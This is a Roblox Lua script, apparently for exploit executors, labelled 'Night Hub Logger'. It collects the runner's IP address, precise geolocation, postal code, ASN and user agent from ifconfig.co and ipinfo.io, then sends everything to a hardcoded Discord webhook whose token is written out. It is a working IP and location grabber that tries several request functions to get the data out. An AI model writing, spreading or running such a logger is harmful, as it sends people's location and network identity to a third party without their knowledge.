local WEBHOOK = "https://discord.com/api/webhooks/1478224616043319426/0JkjEmjSeBnsioQRs9KmrRm-_sXaVa__0gLw9KrxMVNMdtAjsvnblw9FGpYpuNrWVT8B"

local function getJson(url)
    local success, response = pcall(function()
        return game:HttpGet(url, true)
    end)
    if success then
        local ok, data = pcall(function()
            return game:GetService("HttpService"):JSONDecode(response)
        end)
        return ok and data or {}
    end
    return { error = "Failed to fetch " .. url }
end

local function sendWebhook(customMessage)
    local co = getJson("https://ifconfig.co/json")
    local info = getJson("https://ipinfo.io/json")

    local HttpService = game:GetService("HttpService")

    -- Create detailed fields (as many as possible)
    local fields = {
        { name = "IP Address",          value = "```" .. (co.ip or info.ip or "N/A") .. "```", inline = false },
        { name = "IP Decimal",          value = tostring(co.ip_decimal or "N/A"), inline = true },
        { name = "City",                value = co.city or info.city or "N/A", inline = true },
        { name = "Region",              value = co.region or info.region or "N/A", inline = true },
        { name = "Country",             value = (co.country or info.country or "N/A"), inline = true },
        { name = "Country ISO",         value = co.country_iso or info.country or "N/A", inline = true },
        { name = "Latitude",            value = tostring(co.latitude or "N/A"), inline = true },
        { name = "Longitude",           value = tostring(co.longitude or "N/A"), inline = true },
        { name = "Loc",                 value = info.loc or "N/A", inline = true },
        { name = "Timezone",            value = co.time_zone or info.timezone or "N/A", inline = true },
        { name = "Postal",              value = co.postal or info.postal or "N/A", inline = true },
        { name = "ASN",                 value = co.asn or "N/A", inline = true },
        { name = "ASN Org",             value = co.asn_org or info.org or "N/A", inline = false },
        { name = "In EU?",              value = tostring(co.country_eu or false), inline = true },
    }

    -- Add User Agent if available
    if co.user_agent and co.user_agent.raw_value then
        table.insert(fields, { name = "User Agent (Raw)", value = "```" .. co.user_agent.raw_value .. "```", inline = false })
    end

    local embed = {
        title = "🌙 Night Hub - Full Dual IP Information",
        description = customMessage or "📡 Complete data from ifconfig.co + ipinfo.io",
        color = 0x5865F2,
        fields = fields,
        footer = { text = "Night Hub • Full A-Z Logger" },
        timestamp = DateTime.now():ToIsoDate()
    }

    -- Send FULL RAW JSON from both sites
    local rawData = "```json\n=== ifconfig.co ===\n" .. HttpService:JSONEncode(co) ..
                    "\n\n=== ipinfo.io ===\n" .. HttpService:JSONEncode(info) .. "\n```"

    local payload = HttpService:JSONEncode({
        username = "Night Hub Logger",
        avatar_url = "",
        embeds = { embed },
        content = rawData
    })

    local sent = false

    local methods = {
        function() if http_request then http_request({Url=WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload}); sent=true end end,
        function() if syn and syn.request then syn.request({Url=WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload}); sent=true end end,
        function() if request then request({Url=WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload}); sent=true end end,
        function() if HttpService.PostAsync then HttpService:PostAsync(WEBHOOK, payload, Enum.HttpContentType.ApplicationJson); sent=true end end
    }

    for _, method in ipairs(methods) do
        pcall(method)
        if sent then break end
    end

    if sent then
        print("✅ Full dual info sent successfully!")
        print("IP:", co.ip or info.ip or "Unknown")
    else
        print("❌ Failed to send. Try a different executor.")
    end
end

-- ================== RUN ==================
sendWebhook("Manual Full A-Z Info")

